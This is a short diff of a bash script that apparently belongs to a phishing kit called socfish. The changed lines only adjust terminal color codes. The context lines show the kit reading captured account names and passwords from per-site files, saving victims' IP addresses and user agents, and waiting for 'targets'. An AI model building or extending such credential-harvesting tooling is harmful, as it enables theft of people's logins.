@@ -188,7 +188,7 @@ rm -rf ~/socfish/sites
 cp -r ~/.socfish/sites ~/socfish
 rm -rf ~/.socfish
 } &> /dev/null
-echo ""$GNS"["$CE"+"$GSA"] Successfully updated!"$CE""
+echo -e "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] Successfully updated!\033[0m"
 sleep 1
 exit
 
@@ -286,7 +286,7 @@ password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m]\033[0m\033[1;92m Account:\033[0m\033[1;77m %s\n\033[0m" $account
 printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m]\033[0m\033[1;92m Password:\033[0m\033[1;77m %s\n\033[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m sites/%s/saved.usernames.txt\033[0m\n" $server
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m sites/%s/saved.usernames.txt\033[0m\n" $server
 sleep 0.5
 printf "\n\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Waiting for targets...\033[0m\n"
 }
@@ -299,7 +299,7 @@ IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] Target IP:\033[0m\033[1;77m %s\033[0m\n" $ip
 printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] User-Agent:\033[0m\033[1;77m %s\033[0m\n" $ua
-printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m %s/saved.ip.txt\033[0m\n" $server
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m %s/saved.ip.txt\033[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
